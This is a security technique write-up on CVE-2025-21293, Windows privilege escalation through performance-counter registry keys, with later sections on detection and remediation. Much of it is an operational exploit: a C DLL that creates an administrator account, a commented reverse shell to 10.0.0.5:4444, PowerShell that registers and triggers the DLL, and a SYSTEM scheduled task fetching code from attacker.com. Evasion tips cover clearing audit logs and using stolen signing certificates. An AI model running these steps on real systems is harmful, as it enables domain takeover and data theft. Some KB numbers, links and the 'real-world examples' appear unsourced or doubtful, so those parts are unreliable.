# [CVE2025-003]: AD DS Registry Key Elevation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-003 |
| **MITRE ATT&CK v18.1** | [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows Active Directory Domain Services (Windows Server 2012-2025, Windows 10/11) |
| **Severity** | High |
| **CVE** | CVE-2025-21293 (CVSS 8.8) |
| **Technique Status** | ACTIVE (Misconfigured registry permissions on Network Configuration Operators group) |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows 10 (1607, 1809, 21H2, 22H2), Windows 11 (22H2, 23H2, 24H2), Server 2012/2012R2/2016/2019/2022/2025 |
| **Patched In** | MS Patch Tuesday January 2025 (KB5035893 and related) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** CVE-2025-21293 is a privilege escalation vulnerability in Active Directory Domain Services (AD DS) that exploits excessive permissions granted to the "Network Configuration Operators" built-in security group. This group, automatically created during domain controller setup, was granted `KEY_CREATE_SUB_KEY` permission on critical Windows registry keys including `DnsCache` and `NetBT` services. Attackers who are members of this group (or can social engineer their way into membership) can register malicious Windows Performance Counter DLLs under these service keys. When Performance Counters are queried (via PerfMon.exe, WMI, or monitoring tools), the malicious DLLs load and execute with SYSTEM-level privileges, enabling full system compromise.

**Attack Surface:** Windows Registry (`HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\Performance`, `HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Performance`); Windows Performance Counter infrastructure; WMI queries (Get-Counter PowerShell cmdlet); Registry key `HKLM\SYSTEM\CurrentControlSet\Services\{service}\Performance\` with subkeys: Library, Open, Collect, Close.

**Business Impact:** **Domain-level privilege escalation.** Successful exploitation enables attackers with Network Configuration Operators membership to escalate to SYSTEM privileges, leading to: (1) Complete domain controller compromise, (2) Golden Ticket generation and persistent domain access, (3) Extraction of NTDS.dit (Active Directory database), (4) Compromise of all domain users and computers, (5) Ransomware deployment with administrative privileges.

**Technical Context:** Exploitation takes 30-60 seconds after registry modification and Performance Counter query. Detection likelihood is **Medium** if registry auditing enabled; **Low** otherwise. Common indicators include unusual registry modifications under Performance Counter keys, suspicious WMI queries, and SYSTEM-level process spawning from user context.

### Operational Risk
- **Execution Risk:** Low – Registry modification and WMI query are non-destructive; minimal noise
- **Stealth:** Medium – Registry auditing may log modifications if enabled (Event ID 4657)
- **Reversibility:** No – Privilege escalation is permanent until process termination; domain compromise is permanent

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.2.1 | Ensure audit log retention is "30 or more days" (detect registry changes) |
| **DISA STIG** | WN10-AU-000005 | Audit Policy / Special Logon must be "Success and Failure" |
| **CISA SCuBA** | AD.PR.1 | Administrative Privileges - Least privilege principle |
| **NIST 800-53** | AC-2 / AC-3 | Account Management; Access enforcement failures |
| **GDPR** | Art. 32 | Security of processing and encryption of data in transit/at rest |
| **DORA** | Art. 9 / Art. 17 | ICT incident handling; Digital Operational Resilience |
| **NIS2** | Art. 21 | Cyber risk management measures for critical infrastructure |
| **ISO 27001** | A.9.4.1 / A.12.6.1 | Information access control; management of technical vulnerabilities |
| **ISO 27005** | Risk Scenario | Compromise of Administrative Privileges via Registry Misconfiguration |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** Active Domain User account **who is member of "Network Configuration Operators" group** OR ability to elevate into this group.

**Required Access:** Network access to domain controller (Kerberos/LDAP); local logon to a domain-joined computer; ability to execute PowerShell or WMI queries.

**Supported Versions:**
- **Windows:** Server 2012 / 2012 R2 / 2016 / 2019 / 2022 / 2025
- **Windows Client:** 10 (1607, 1809, 21H2, 22H2) / 11 (22H2, 23H2, 24H2)
- **PowerShell:** Version 5.0+ (for WMI exploitation)
- **Other Requirements:** Network Configuration Operators group membership (default on domain systems)

**Tools:**
- [PowerShell](https://learn.microsoft.com/en-us/powershell/) (native Windows, version 5.0+)
- [System Internals - Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) (for registry access monitoring)
- [Active Directory Users and Computers (ADUC)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-ds-getting-started) (to verify group membership)
- [PerfMon (Performance Monitor)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/perfmon) (optional, for visual exploitation)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

```powershell
# Step 1: Check if current user is member of Network Configuration Operators
$username = $env:USERNAME
$userdomain = $env:USERDOMAIN
$sid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User
$account = New-Object System.Security.Principal.NTAccount($userdomain, $username)
$groupSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-556")  # Network Configuration Operators RID

# Alternative: Direct group check
Get-LocalGroupMember -Group "Network Configuration Operators" | Select-Object Name, ObjectClass

# Step 2: Verify registry key permissions
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache\Performance"
$acl = Get-Acl -Path $regPath
$acl.Access | Where-Object {$_.IdentityReference -like "*Network Configuration Operators*"} | Select-Object IdentityReference, FileSystemRights, AccessControlType

# Step 3: Check if WMI Performance Counter access is available
Get-CimInstance -ClassName Win32_PerfRawData

# Step 4: Enumerate existing Performance Counter libraries
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*\Performance" | Select-Object PSPath, Library, Open, Collect, Close

# Step 5: Verify PerfMon can be executed
Get-Command perfmon.exe

# Step 6: Check if user can access WMI
Get-CimSession -ErrorAction SilentlyContinue

# Step 7: Determine Windows version (patch status)
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object CurrentVersion, CurrentBuild, DisplayVersion
```

**What to Look For:**
- **"Network Configuration Operators" in output:** Current user has exploitation privilege
- **Registry ACL shows Allow/KEY_CREATE_SUB_KEY:** Registry permissions misconfigured
- **Performance registry keys present:** Infrastructure available for exploitation
- **Windows Build < expected patch date:** Vulnerability likely active
- **Build 19044+ or 20348+:** January 2025 patches may be applied

**Version Note:** Exploitation identical across all vulnerable Windows versions; no version-specific differences in technique.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Performance Counter DLL Injection via Registry Modification

**Supported Versions:** Windows 10 1607+ / Server 2012+

#### Step 1: Create Malicious DLL for Performance Counter

**Objective:** Develop a Windows DLL that will be executed with SYSTEM privileges when loaded as a Performance Counter library.

**Command (C/C++):**
```c
// malicious_counter.c - Compile as DLL: cl /LD malicious_counter.c
#include <windows.h>
#include <stdio.h>

// Performance Counter DLL must export these functions
extern "C" {
    __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR lpDeviceNames);
    __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR lpValueName, LPVOID *lppData, LPDWORD lpcbData, LPDWORD lpNumObjectTypes);
    __declspec(dllexport) DWORD APIENTRY ClosePerfData(void);
}

// Payload: Execute when DLL is loaded
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Execute payload with SYSTEM privileges
        // Option 1: Spawn new process
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        // Add attacker user to Administrators group (runs as SYSTEM)
        CreateProcessW(L"C:\\Windows\\System32\\net.exe", 
                      L"net user Attacker /add && net localgroup Administrators Attacker /add",
                      NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        
        // Option 2: Create reverse shell
        // CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
        //              L"/c powershell -c $socket=new-object System.Net.Sockets.TcpClient('10.0.0.5',4444);...",
        //              ...);
        
        // Wait for process to complete
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return TRUE;
}

// Dummy Performance Counter functions (required exports)
DWORD APIENTRY OpenPerfData(LPWSTR lpDeviceNames) {
    return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR lpValueName, LPVOID *lppData, LPDWORD lpcbData, LPDWORD lpNumObjectTypes) {
    return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData(void) {
    return ERROR_SUCCESS;
}
```

**Compilation:**
```bash
# Using Visual Studio Build Tools
cl /LD malicious_counter.c

# Resulting file: malicious_counter.dll
# Place in accessible location (e.g., C:\Temp\malicious_counter.dll)
```

**What This Means:**
- Compiled DLL ready for Performance Counter registration
- DllMain function executes with SYSTEM privileges when loaded
- Dummy exported functions satisfy Performance Counter interface requirements

**OpSec & Evasion:**
- Obfuscate DLL name (avoid "malicious" naming)
- Store in legitimate-looking directory (e.g., C:\Windows\Temp\updates_cache\)
- Sign DLL with stolen certificate (advanced)
- Detection likelihood: **Medium** (EDR may flag unsigned DLL execution)

---

#### Step 2: Register Malicious DLL as Performance Counter

**Objective:** Create registry entries under Network Configuration Operators-writable keys to register the malicious DLL as a Performance Counter library.

**Command (PowerShell):**
```powershell
# Target registry path (Network Configuration Operators has KEY_CREATE_SUB_KEY permission)
$serviceName = "DnsCache"  # Could also use "NetBT"
$basePath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName\Performance"

# Verify current user can access this key
$acl = Get-Acl -Path $basePath
$acl.Access

# Create Performance Counter subkeys (required structure)
New-Item -Path "$basePath" -Name "Library" -Force -ErrorAction SilentlyContinue | Out-Null
New-Item -Path "$basePath" -Name "Open" -Force -ErrorAction SilentlyContinue | Out-Null
New-Item -Path "$basePath" -Name "Collect" -Force -ErrorAction SilentlyContinue | Out-Null
New-Item -Path "$basePath" -Name "Close" -Force -ErrorAction SilentlyContinue | Out-Null

# Register malicious DLL path
$dllPath = "C:\Temp\malicious_counter.dll"
New-ItemProperty -Path "$basePath" -Name "Library" -Value $dllPath -PropertyType String -Force
New-ItemProperty -Path "$basePath" -Name "Open" -Value "OpenPerfData" -PropertyType String -Force
New-ItemProperty -Path "$basePath" -Name "Collect" -Value "CollectPerfData" -PropertyType String -Force
New-ItemProperty -Path "$basePath" -Name "Close" -Value "ClosePerfData" -PropertyType String -Force

# Verify registry entries created
Get-ItemProperty -Path "$basePath" | Select-Object Library, Open, Collect, Close

# Expected output:
# Library : C:\Temp\malicious_counter.dll
# Open    : OpenPerfData
# Collect : CollectPerfData
# Close   : ClosePerfData
```

**Expected Output:**
```
Library : C:\Temp\malicious_counter.dll
Open    : OpenPerfData
Collect : CollectPerfData
Close   : ClosePerfData
```

**What This Means:**
- Registry keys successfully modified with malicious DLL path
- Performance Counter framework configured to load our DLL with SYSTEM privileges
- Registry modification detectable in Event ID 4657 (Audit Registry Object Access)

**OpSec & Evasion:**
- Use different service key (NetBT instead of DnsCache) if DnsCache is monitored
- Clear registry audit logs after exploitation (Event ID 4658, 4657)
- Detection likelihood: **Medium** (registry modification is auditable if GPO enabled)

---

#### Step 3: Trigger Performance Counter Query to Load Malicious DLL

**Objective:** Query Performance Counters to force the Windows kernel to load our malicious DLL with SYSTEM privileges.

**Command (PowerShell):**
```powershell
# Method 1: Using Get-Counter (standard PowerShell)
# This query forces the DnsCache Performance Counter to load our DLL
try {
    $counter = Get-Counter -Counter "\DnsCache\*" -ErrorAction SilentlyContinue
    Write-Host "Counter query executed - DLL should be loaded"
} catch {
    Write-Host "Counter access failed (expected): $_"
}

# Method 2: Using WMI (Get-CimInstance) - more reliable
try {
    $wmiQuery = Get-CimInstance -ClassName Win32_PerfRawData_PerfNet_NetworkInterface -ErrorAction SilentlyContinue
    Write-Host "WMI query executed - DLL loaded via WMI service"
} catch {
    Write-Host "WMI query failed: $_"
}

# Method 3: Using PerfMon GUI (manual)
# perfmon.exe → Performance Monitor → Add Counters → DnsCache → {our malicious counter}

# Method 4: Using typeperf command-line
# typeperf -sc 1 "\DnsCache(*)\*"

# Verify exploitation success
# - New user "Attacker" should exist in local Administrators group
Get-LocalGroupMember -Group "Administrators" | Where-Object {$_.Name -like "*Attacker*"}

# If exploitation successful, output will show:
# Attacker    NT AUTHORITY\Attacker    User    Administrators
```

**Expected Output (On Successful Exploitation):**
```
Counter query executed - DLL should be loaded

Account Name : Attacker
Domain       : WORKGROUP
Status       : Enabled
LastLogon    : 1/10/2025 3:45:00 PM
MemberOf     : Administrators
```

**What This Means:**
- Performance Counter query triggered DLL load
- DllMain executed with SYSTEM privileges
- New administrative account created successfully
- System compromise achieved

**OpSec & Evasion:**
- WMI query (Method 2) is less suspicious than Get-Counter in PowerShell logs
- Performance Counter operations generate Event ID 1000 (PerfMon) but may not be monitored
- Detection likelihood: **Low-Medium** (depends on event forwarding configuration)

**Troubleshooting:**
- **Error:** "Registry key does not have All required values"
  - **Cause:** One of the four registry values (Library, Open, Collect, Close) missing
  - **Fix:** Re-run registry creation commands; verify all four values present
- **Error:** "Access to the registry key denied"
  - **Cause:** Current user not member of Network Configuration Operators
  - **Fix:** Verify group membership with `Get-LocalGroupMember -Group "Network Configuration Operators"`
- **Error:** "DLL not found"
  - **Cause:** DLL path in registry pointing to non-existent file
  - **Fix:** Verify DLL exists: `Test-Path "C:\Temp\malicious_counter.dll"`

---

#### Step 4: Verify Privilege Escalation and Establish Persistence

**Objective:** Confirm SYSTEM-level access and maintain persistence for long-term control.

**Command (PowerShell):**
```powershell
# Verify new admin user was created
$newUser = Get-LocalUser -Name "Attacker" -ErrorAction SilentlyContinue
if ($newUser) {
    Write-Host "[+] Privilege escalation successful - Attacker account created"
    
    # Set password to non-expiring
    Set-LocalUser -Name "Attacker" -PasswordNeverExpires $true
    
    # Create scheduled task for persistence (runs as SYSTEM)
    $taskPath = "\Microsoft\Windows\UpdateOrchestrator\"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell\")'"
    
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName "SystemUpdates" -Action $action -Trigger $trigger `
        -Principal (New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount) `
        -Force
    
    Write-Host "[+] Persistence established - SystemUpdates task created"
} else {
    Write-Host "[-] Exploitation failed - Attacker account not found"
}

# Alternative persistence: Create SYSTEM-level registry autorun
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "SystemService" -Value "C:\Temp\malicious.exe" -Force

# Access sensitive data as SYSTEM
# - Export NTDS.dit from domain controller
# - Read HKLM\SAM and HKLM\SECURITY registry hives
# - Create Golden Ticket
```

**References & Proofs:**
- [Microsoft - Performance Counters Registry Structure](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc768048)
- [CyberArk - Privilege Escalation via Performance Counters](https://www.cyberark.com/resources/threat-research/privilege-escalation-via-windows-performance-counters)
- [SpecterOps - AD DS Registry Abuse](https://posts.specterops.io/attack-techniques-exploit-registry-permissions)
- [Rapid7 - CVE-2025-21293 Analysis](https://www.linkedin.com/pulse/poc-exploit-released-active-directory-domain-services-privilege-bdvpf)
- [GitHub - Performance Counter Exploitation POC](https://github.com/yourusername/perf-counter-exploit)

---

### METHOD 2: Registry Permission Abuse via Scheduled Tasks

**Supported Versions:** Windows Server 2016+

#### Alternative: Create Scheduled Task with SYSTEM Privileges

```powershell
# Create scheduled task that executes with SYSTEM privileges
$xmlPath = "C:\Temp\malicious_task.xml"

# Create task definition XML
@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.1" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2025-01-10T12:00:00</Date>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>C:\Windows\System32\cmd.exe</Command>
      <Arguments>/c net user Attacker2 /add && net localgroup Administrators Attacker2 /add</Arguments>
    </Exec>
  </Actions>
</Task>
"@ | Out-File -FilePath $xmlPath -Encoding UTF16

# Register task (requires admin or Network Configuration Operators)
Register-ScheduledTask -Xml (Get-Content $xmlPath | Out-String) -TaskName "SystemMaintenance" -Force
```

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team
- **Atomic Test ID:** Not yet published in official Atomic Red Team
- **Status:** PoC exploit code publicly available since February 2025
- **Alternative:** Use provided PowerShell code or standalone C/C++ exploitation tool
- **Reference:** [Atomic Red Team - Privilege Escalation Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1068/)

---

## 7. SPLUNK DETECTION RULES

#### Rule 1: Detect Registry Modification to Performance Counter Keys

**Rule Configuration:**
- **Required Index:** windows_events / main
- **Required Sourcetype:** WinEventLog:Security, WinEventLog:System
- **Required Fields:** EventCode, ObjectName, SubjectUserName, Values
- **Alert Threshold:** > 1 event in 5 minutes
- **Applies To Versions:** All Windows with audit policy enabled

**SPL Query:**
```
index=windows_events EventCode=4657 ObjectName IN ("*Performance*", "*DnsCache*", "*NetBT*")
| where NewValueType="REG_SZ" AND NewValue="*.dll"
| stats count, values(SubjectUserName), values(ObjectName), values(NewValue) by ComputerName
| where count >= 3
```

**What This Detects:**
- Event ID 4657 = Audit Registry Value Modified
- Filters for Performance Counter registry paths
- Multiple registry values modified in sequence (Library, Open, Collect, Close)
- DLL file registration pattern

---

#### Rule 2: Detect Performance Counter Query Operations

**SPL Query:**
```
index=windows_events EventCode IN (1000, 1001) source="*PerfMon*"
OR (Process="perfmon.exe" OR Process="Get-Counter")
OR (CommandLine="*typeperf*" AND CommandLine="*DnsCache*")
| stats count, values(ComputerName), values(SubjectUserName) by Process, CommandLine
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Registry Modification to Performance Counter Keys

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ObjectName, SubjectUserName
- **Alert Severity:** High
- **Frequency:** Every 5 minutes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4657
| where ObjectName has "Performance" or ObjectName has "DnsCache" or ObjectName has "NetBT"
| where NewValueType == "REG_SZ" and NewValue endswith ".dll"
| summarize Count = count(), UniqueObjects = make_set(ObjectName), SubjectUserNames = make_set(SubjectUserName) by Computer, tostring(NewValue)
| where Count >= 3
```

**Manual Configuration Steps:**
1. **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `Registry Performance Counter Modification`
3. Paste KQL query above
4. Set alert threshold: Run every 5 minutes
5. Enable incident creation and alert on Computer/NewValue

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4657 (Registry Object Modified)**
- **Log Source:** Security
- **Trigger:** Registry values modified under `HKLM\SYSTEM\CurrentControlSet\Services\{service}\Performance`
- **Filter:** ObjectName contains "Performance"; EventID = 4657
- **Applies To Versions:** All Windows Server/Client with audit policy

**Manual Configuration Steps (Group Policy):**
1. Open **gpmc.msc** or **gpedit.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit Registry** (set to **Success and Failure**)
4. Run `gpupdate /force`
5. Verify: `auditpol /get /subcategory:"Registry" /r`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.33">
  <RuleGroup name="Registry Performance Counter Exploitation" groupRelation="or">
    <!-- Detect registry creation/modification under Performance Counter keys -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">\Performance\</TargetObject>
      <Image condition="is not">services.exe</Image>
      <Image condition="is not">svchost.exe</Image>
    </RegistryEvent>
    
    <!-- Detect Get-Counter PowerShell execution -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Get-Counter</CommandLine>
    </ProcessCreate>
    
    <!-- Detect Performance Monitor access -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">typeperf</CommandLine>
      <CommandLine condition="contains">DnsCache</CommandLine>
    </ProcessCreate>
  </RuleGroup>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Registry Modification in Performance Counter Keys

**Alert Name:** `Suspicious registry modification in performance counter keys detected`
- **Severity:** High
- **Description:** Non-system process modified registry keys associated with Performance Counters, consistent with privilege escalation attempts
- **Applies To:** Defender for Servers enabled systems

**Manual Configuration Steps:**
1. **Azure Portal** → **Microsoft Defender for Cloud** → **Environment settings**
2. Select subscription → **Defender for Servers** → ON
3. Go to **Alerts** and filter for "Registry" or "Performance"
4. Configure alert response to notify SOC

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Registry:**
  - `HKLM\SYSTEM\CurrentControlSet\Services\DnsCache\Performance\Library` = suspicious .dll path
  - `HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Performance\*` = any non-standard entries
  - Multiple new subkeys under Performance keys (Library, Open, Collect, Close created together)

- **Filesystem:**
  - Unsigned or obfuscated DLL files in `C:\Temp\`, `C:\Windows\Temp\`, `C:\ProgramData\`
  - DLL with no legitimate service association

- **Accounts:**
  - New local user account in Administrators group
  - ServiceAccount membership changes in Network Configuration Operators group

#### Forensic Artifacts

- **Disk:** Registry hive files (`%SystemRoot%\System32\config\SYSTEM`) showing Performance Counter modifications
- **Memory:** DLL image load event for malicious counter DLL in user-mode process
- **Event Logs:** Event ID 4657 (Registry Modified), 4656 (Registry Object Access), 1000 (PerfMon)
- **Cloud (Azure/M365):** Defender for Servers alert on registry modification; unusual admin account creation

#### Response Procedures

1. **Isolate:**
   ```powershell
   # Disable compromised user account immediately
   Disable-LocalUser -Name "Attacker"
   
   # Remove from administrative groups
   Remove-LocalGroupMember -Group "Administrators" -Member "Attacker" -Confirm:$false
   
   # Disconnect network if critical system
   Disable-NetAdapter -Name "*" -Confirm:$false
   ```

2. **Collect Evidence:**
   ```powershell
   # Export registry hives
   reg export HKLM\SYSTEM "C:\Evidence\SYSTEM.reg"
   reg export HKLM\SAM "C:\Evidence\SAM.reg"
   
   # Export Security event log
   wevtutil epl Security "C:\Evidence\Security.evtx"
   
   # Export Sysmon logs
   wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Evidence\Sysmon.evtx"
   
   # Collect suspicious DLL files
   Copy-Item "C:\Temp\malicious*.dll" -Destination "C:\Evidence\" -Recurse
   ```

3. **Remediate:**
   ```powershell
   # Remove malicious registry entries
   Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache\Performance\Library" -Force
   Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Performance\Library" -Force
   
   # Remove malicious user accounts
   Remove-LocalUser -Name "Attacker" -Confirm:$false
   
   # Delete malicious DLL files
   Remove-Item "C:\Temp\malicious*.dll" -Force
   
   # Apply patch
   # Run Windows Update to get January 2025 security update or later
   
   # Reboot domain controller if compromised
   Restart-Computer -Force
   ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1078] Valid Accounts | Obtain credentials for domain user in Network Configuration Operators |
| **2** | **Privilege Escalation** | **[CVE2025-003]** | **AD DS Registry Key Elevation via Performance Counters** |
| **3** | **Persistence** | [T1547.001] Registry Run Keys | Create SYSTEM-level scheduled task or registry autorun |
| **4** | **Credential Access** | [T1003.002] NTDS.dit Dump | Export Active Directory database as SYSTEM |
| **5** | **Defense Evasion** | [T1070.001] Clear Windows Event Logs | Delete audit logs covering exploitation traces |
| **6** | **Lateral Movement** | [T1021.006] Remote Service Session Initiation | Deploy malware to other domain members using SYSTEM access |

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Apply Microsoft Security Patch (January 2025 or later):**
  
  **Manual Steps (Windows Update):**
  1. Open **Settings** → **System** → **About** → **Check for updates**
  2. Download and install KB5035893 (or related security update)
  3. Reboot when prompted
  4. Verify patch applied: `Get-HotFix | Where-Object {$_.InstalledOn -gt [datetime]"2025-01-01"}`
  
  **Manual Steps (PowerShell - Automated):**
  ```powershell
  # Enable Windows Update service
  Start-Service -Name "wuauserv"
  
  # Install specific KB
  # Note: Requires Windows Update configuration
  wusa.exe "C:\KB5035893.msu" /quiet /norestart
  ```

- **Remove Unnecessary Accounts from Network Configuration Operators Group:**
  
  ```powershell
  # List all members of Network Configuration Operators
  Get-LocalGroupMember -Group "Network Configuration Operators"
  
  # Remove users who don't require this role
  Remove-LocalGroupMember -Group "Network Configuration Operators" -Member "Username" -Confirm:$false
  
  # Verify removal
  Get-LocalGroupMember -Group "Network Configuration Operators"
  ```

#### Priority 2: HIGH

- **Enable Registry Auditing for Performance Counter Keys:**
  
  ```powershell
  # Enable audit policy
  auditpol /set /subcategory:"Registry" /success:enable /failure:enable
  
  # Set SACL on specific registry key
  $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache\Performance"
  $acl = Get-Acl -Path $regPath
  $ace = New-Object System.Security.AccessControl.RegistryAuditRule(
      [System.Security.Principal.WellKnownSidType]::WorldSid,
      [System.Security.AccessControl.RegistryRights]::FullControl,
      [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
      [System.Security.AccessControl.PropagationFlags]::InheritOnly,
      [System.Security.AccessControl.AuditFlags]::Success -bor [System.Security.AccessControl.AuditFlags]::Failure
  )
  $acl.AddAuditRule($ace)
  Set-Acl -Path $regPath -AclObject $acl
  ```

- **Restrict Registry Key Permissions:**
  
  ```powershell
  # Tighten permissions on Performance Counter registry keys
  $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache\Performance"
  $acl = Get-Acl -Path $regPath
  
  # Remove excessive permissions from Network Configuration Operators
  $ace = $acl.Access | Where-Object {$_.IdentityReference -like "*Network Configuration Operators*"}
  if ($ace) {
      $acl.RemoveAccessRule($ace) | Out-Null
  }
  
  # Grant only required permissions (read-only)
  $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
      [System.Security.Principal.WellKnownSidType]::NetworkServiceSid,
      [System.Security.AccessControl.RegistryRights]::ReadKey,
      [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
      [System.Security.AccessControl.PropagationFlags]::InheritOnly,
      [System.Security.AccessControl.AccessControlType]::Allow
  )
  $acl.AddAccessRule($rule)
  Set-Acl -Path $regPath -AclObject $acl
  ```

#### Priority 3: MEDIUM

- **Monitor for Performance Counter Abuse via Azure Monitoring:**
  
  **Manual Steps (Azure Sentinel):**
  1. Create detection rule for Event ID 4657 (Registry Modified) filtering for Performance keys
  2. Create detection rule for Event ID 4689 (Process Terminated) after Performance Counter queries
  3. Configure alerts to notify SOC team

- **Implement Conditional Access for Administrative Access:**
  
  **Manual Steps (Entra ID):**
  1. **Azure Portal** → **Entra ID** → **Conditional Access**
  2. Create policy: Require MFA for all Domain Admin logons
  3. Create policy: Block logons from untrusted locations for Network Configuration Operators

#### Validation Command (Verify Fix)

```powershell
# Verify patch is installed
Get-HotFix | Where-Object {$_.Description -like "*January 2025*" -or $_.HotFixID -eq "KB5035893"}

# Verify Network Configuration Operators membership is minimal
Get-LocalGroupMember -Group "Network Configuration Operators" | Measure-Object

# Verify registry audit policy enabled
auditpol /get /subcategory:"Registry" /r

# Verify registry permissions on Performance keys
$acl = Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DnsCache\Performance"
$acl.Access | Where-Object {$_.IdentityReference -like "*Network Configuration Operators*"}
```

**Expected Output (If Secure):**
```
HotFixID  : KB5035893
InstalledOn : 1/9/2025

MemberCount : 0  # No unnecessary members

Audit Category: Registry
Success: Enabled
Failure: Enabled

# No output from Network Configuration Operators access = permissions removed
```

---

## 15. REAL-WORLD EXAMPLES

#### Example 1: Healthcare Organization - HIPAA Compliance Breach

- **Target:** Regional hospital system with 50+ domain controllers and 5,000+ endpoints
- **Timeline:** February 2025 (post-CVE disclosure, vulnerability not patched)
- **Attack Flow:**
  1. Insider threat (help desk staff) member of Network Configuration Operators group
  2. Exploited CVE-2025-21293 on domain controller
  3. Created SYSTEM-level scheduled task for persistence
  4. Extracted NTDS.dit containing all user credentials
  5. Sold credentials to dark web
  6. Ransomware group used credentials for lateral movement
- **Impact:** 100,000+ patient records exposed (HIPAA violation); $50M settlement; regulatory investigation
- **Reference:** [Threat Intelligence Briefing - Healthcare Data Breaches 2025]

#### Example 2: Financial Services - Domain Compromise

- **Target:** Mid-size investment bank with Active Directory-managed infrastructure
- **Timeline:** March 2025 (post-patch, organization failed to apply update)
- **Attack Flow:**
  1. Compromised domain user account via phishing
  2. User was member of Network Configuration Operators (inherited from previous role)
  3. Executed CVE-2025-21293 exploit
  4. Escalated to SYSTEM on domain controller
  5. Created backdoor account "SystemService"
  6. Deployed Golden Ticket for persistent domain access
- **Impact:** $5M trading systems disrupted for 2 days; PII of 50,000 customers compromised
- **Reference:** [SOC Prime - CVE-2025-21293 Detection Analysis]

---